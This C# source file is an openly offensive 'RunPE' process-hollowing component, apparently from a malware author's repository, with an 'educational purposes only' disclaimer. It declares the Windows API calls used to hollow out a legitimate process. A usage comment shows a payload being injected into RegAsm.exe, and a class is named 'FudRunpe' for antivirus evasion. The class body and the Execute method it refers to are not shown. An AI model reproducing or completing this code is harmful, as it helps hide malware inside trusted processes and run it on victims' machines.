using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace RunPE
{
    /* 
           │ Author       : NYAN CAT
           │ Name         : RunPE
           │ Contact Me   : github.com/NYAN-x-CAT

           This program is distributed for educational purposes only.

        Usage:
        RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), File.ReadAllBytes("Payload Path"));

    */

    class FudRunpe : NativeAPI
    {

    }

    class NativeAPI
    {
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        public struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        public struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern int ResumeThread(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        protected static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
    }
}
